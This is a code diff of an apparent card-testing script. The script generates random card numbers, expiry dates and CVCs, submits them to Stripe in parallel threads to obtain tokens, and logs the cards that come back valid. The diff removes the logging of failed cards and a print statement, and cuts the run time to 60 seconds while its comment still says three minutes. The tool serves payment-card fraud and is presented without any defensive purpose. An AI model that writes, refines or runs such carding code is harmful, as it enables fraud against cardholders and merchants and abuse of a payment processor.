@@ -10,7 +10,6 @@ from threading import Lock
 import time
 
 # Define locks for each file
-dead_file_lock = Lock()
 live_file_lock = Lock()
 result_file_lock = Lock()
 
@@ -31,7 +30,6 @@ def generate_random_card():
     exp_month = str(random.randint(1, 12)).zfill(2)
     exp_year = str(random.randint(2023, 2030))
     cvc = ''.join(random.choices('0123456789', k=3))
-    print(card_number + "|" + exp_month + "|" + exp_year + "|" + cvc)
     return card_number, exp_month, exp_year, cvc
 
 def get_stripe_token(card_number, exp_month, exp_year, cvc):
@@ -102,9 +100,6 @@ def process_card():
     try:
         token, msg = get_stripe_token(card_number, exp_month, exp_year, cvc)
         if token == "":
-            with dead_file_lock:
-                with open("dead.txt", "a") as dead_file:
-                    dead_file.write(f"{card_number}|{exp_month}|{exp_year}|{cvc}\n")
             return
         
         result = f"{card_number}|{exp_month}|{exp_year}|{cvc}"
@@ -124,7 +119,7 @@ def process_card():
 
 def main():
     max_workers = 5  # Number of threads to use
-    duration = 180  # Run time in seconds (3 minutes)
+    duration = 60  # Run time in seconds (3 minutes)
     start_time = time.time()
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
